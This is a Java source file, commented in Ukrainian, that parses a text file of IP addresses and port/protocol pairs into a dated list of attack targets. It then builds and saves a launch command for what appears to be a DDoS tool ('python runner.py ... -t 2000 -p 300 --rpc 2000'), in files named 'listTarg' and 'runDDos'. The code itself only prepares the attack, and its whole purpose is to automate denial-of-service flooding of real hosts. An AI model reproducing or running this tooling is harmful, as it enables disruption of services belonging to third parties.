package project;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {
    public static void main(String[] args) {
        String myString;    // рядок або слово для пошуку
        String fileName = "inpddos.txt";
        Path path = Paths.get(fileName);
        String[][] ipmas = new String[200][];
        int indIp=0;    // межа ipmas
        ArrayList<String> aList = new ArrayList<>();
        LocalDateTime date = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy.MM.dd");
        try {
            Scanner scan = new Scanner(path);
            //зчитуємо файл по рядках
            scan.useDelimiter(System.getProperty("line.separator"));    // роздільник - кінець рядку !
            Pattern p1 = Pattern.compile("[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}");
            Pattern p2 = Pattern.compile("[0-9]{1,4}/(tcp|http|htpps)");
            while (scan.hasNext()) {
                myString = scan.next();
                //System.out.println(myString);                // для перевірки
                String[] mas = myString.split(" +|, *|; *|\\(|\\)"); // \\. регулярное выражение
                //System.out.println(Arrays.toString(mas));    // для перевірки
                for(String s: mas){
                    Matcher m1 = p1.matcher(s); Matcher m2 = p2.matcher(s); // m1.matches()
                    if (m1.find()) {  // ip-адреса
                        if (aList.size()>1){    // ip з портами tcp,http,https
                            ipmas[indIp]=new String[aList.size()];  // виділити пам'ять
                            for(int i=0; i<aList.size(); i++) {   // перенос ip з портами в масив
                                ipmas[indIp][i] = aList.get(i);
                            }
                            indIp++;
                        }
                        aList.clear();  // очистити
                        aList.add(s);   // черговий ip
                    }
                    else if (m2.find()) {  // порт
                        aList.add(s);   // черговий порт
                    }
                }
            }
            if (aList.size()>1){    // останній ip з портами tcp,http,https
                ipmas[indIp]=new String[aList.size()];
                for(int i=0; i<aList.size(); i++) {   // перенос ip з портами в масив
                    ipmas[indIp][i] = aList.get(i);
                }
                indIp++;
            }
            scan.close();   // закрити сканер
        }catch(IOException e){
            System.out.println(e.getMessage());
            return;
        }
        /* Контрольне виведення:
        System.out.println("indIp="+indIp);
        for(int i=0; i<indIp; i++){
            for(int j=0; j<ipmas[i].length; j++){
                System.out.print(ipmas[i][j]+" ");
            }
            System.out.println();
        }*/
        String s1,s2,comm="start /b python runner.py ";
        int kilkPort=0;
        // простий список цілей:
        try (FileOutputStream fos = new FileOutputStream("listTarg_"+date.format(formatter)+".txt");
                  PrintStream printSt = new PrintStream(fos)) {    // клас для виведення в поток
            for(int i=0; i<indIp; i++) {
                s1 = ipmas[i][0];
                for (int j = 1; j < ipmas[i].length; j++) {
                    String[] ts = ipmas[i][j].split("[/]");
                    s2=ts[1] + "://" + s1 + ":" + ts[0];    // ціль
                    printSt.printf("%s%n",s2);  // виведення в список
                    comm=comm+s2+" "; // ком.рядок
                    kilkPort++;
                }
            }
        } catch (IOException ex) {  // обробка винятку (исключения)
                System.out.println(ex.getMessage());
        }
        comm+="-t 2000 -p 300 --rpc 2000 --debug";
        System.out.println(comm);
        System.out.println("Всього портів:"+kilkPort);
        // виведення ком.рядка
        try (FileOutputStream fos = new FileOutputStream("runDDos_"+date.format(formatter)+".txt");
            PrintStream printSt = new PrintStream(fos)) {    // клас для виведення в поток
            printSt.printf("%s%n", comm);
            //printStream.flush();  // не потрібне для try-with-resources
        } catch (IOException ex) {  // обробка винятку (исключения)
            System.out.println(ex.getMessage());
        }
    }   // main
    // не використаний:
    // метод вставки символа-рядка в другий рядок в задану позицію
    public static String replaceCharAt(String s, int pos, String c) {
        return s.substring(0,pos) + c + s.substring(pos+c.length());
    }
}